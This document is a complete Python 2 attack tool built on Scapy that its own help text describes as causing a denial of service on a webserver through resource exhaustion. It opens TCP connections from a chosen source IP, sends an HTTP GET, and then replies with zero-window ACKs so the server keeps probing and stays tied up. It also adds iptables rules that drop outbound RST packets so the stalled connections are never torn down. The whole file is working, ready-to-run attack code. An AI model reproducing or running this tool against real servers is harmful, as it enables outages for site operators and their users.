#!/usr/bin/env python

################################
# Contributing authors         #
# Dave Hoelzer, Jason Brewer   #
################################

import argparse
from os import system, popen
from sys import argv, exit, stdout
from scapy.all import *
import random
import time

# Usage Check
if len(argv) == 1:
    print "\nPlease use '-h' for help menu.\n"
    exit(1)


# Setting up the DoS packet
def handle_packet(packet):

  response=IP(dst=packet[IP].src,src=packet[IP].dst)/TCP(window=5, sport=packet[TCP].dport, dport=packet[TCP].sport)
  payload="GET / HTTP/1.0\r\n\r\n"
  respond = False

  if(packet[TCP].flags == 0x12): # 0x12 = 18 in decimal which indicates a SYN/ACK
    response[TCP].seq = sequence + 1
    response[TCP].ack = packet[TCP].seq+1
    response[TCP].flags = "A"
    response = response / Raw(load=payload)
    respond = True
  if(packet[TCP].flags == 0x10 or packet[TCP].flags == 0x18): # 0x10 = 16 in decimal and is an ACK. 0x18 = 24 in decimal is an ACK/PUSH
    response[TCP].seq = sequence + 1 + len(payload)
    response[TCP].ack = packet[TCP].seq
    response[TCP].window=0 # window size is 0 indicating it cannot accept anymore data
    response[TCP].flags = "A"
    respond = True
  if respond:
    send(response, verbose=False)


sequence = 500000 # Static Sequence Number (Change if needed)

# Layers of the packet
def sending_packet(target, target_port, source_ip, number):

    try:
        sp = "tcp and dst host " + source_ip
        ip = IP(dst = target, src = source_ip)

        num_of_packets = 0
        for i in range(int(number)):
            num_of_packets += 1
            tcp = TCP(flags ="S", sport = random.randint(1025,65535), dport = int(target_port), seq = sequence)
            print "\nSending packet %d" % num_of_packets
            send(ip/tcp, verbose=False)

        time.sleep(0.5)
        stdout.write("\n*** Sending ACKs back with a window size of zero indicating no acceptance of data thus causing the server to continuously probe for window size ***.\n") 
        sniff(filter=sp, prn=handle_packet)
    
    except KeyboardInterrupt:
        print "\nUser pressed CTRL-C...Program {} stopping.\n".format(argv[0])


# Block Resets going to server
def block_reset(block):

    reset = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j {}".format(block.upper())
    system(reset)


def flush_iptables(flush):
    
    flush = "F"
    flush = "sudo iptables -{}".format(flush.upper())
    system(flush)


def calling_main():
    main()


def main():

    parser = argparse.ArgumentParser(description="A simple program to cause a DoS on a webserver thru simple resource exhaustion.",
    usage="For initial use:\n{0} -t target ip -p target port -s source ip -r drop -n number of packets.\n\nTo flush iptables:\n{0} -f flush".format(argv[0]))
    parser.add_argument("-t", dest="Target IP", help="Target IP of the webserver")
    parser.add_argument("-p", dest="Target Port", help="Target port of webserver")
    parser.add_argument("-s", dest="Source IP", help="Source IP of where traffic originates")
    parser.add_argument("-r", dest="Block RST", help="Use iptables to block outbound RESET to work properly. Usage: -r drop.\nThis option only needs to be used once."\
    " If you run the program again with this flag, you will add the same outbound rule. Therefore, only use this flag once.")
    parser.add_argument("-f", dest="Flush iptables", help="Flush all iptable rules. Usage: -f flush")
    parser.add_argument("-n", dest="Number of Packets", help="Send number of packets specified")
    parser.add_argument("-v", action="version", version="Current version is 1.0.1.")
    args = parser.parse_args()

    # The 'dest' keyword doen't support spaces so I I chose to validate attribute names this way :)
    position = 1
    target = ''
    target_port = ''
    source_ip = ''
    block = ''
    number = ''
    flush = ''
    Help = ''

    for pos in argv[1:]:
        position += 1

        if pos == "-t":
            target = argv[position]
        if pos == "-p":
            target_port = argv[position]
        if pos == "-s":
            source_ip = argv[position]
        if pos == "-r":
            block = argv[position]
        if pos == "-f":
            flush = argv[position]
        if pos == "-n":
           number = argv[position] 

    if len(argv) == 11:
        sending_packet(target, target_port, source_ip, number)
        block_reset(block)
    elif argv[2] == flush:
        flush_iptables(flush)
    else:
        print "\nUse -h to display options.\n"
        exit(1)
    

if __name__ == '__main__':
    calling_main()
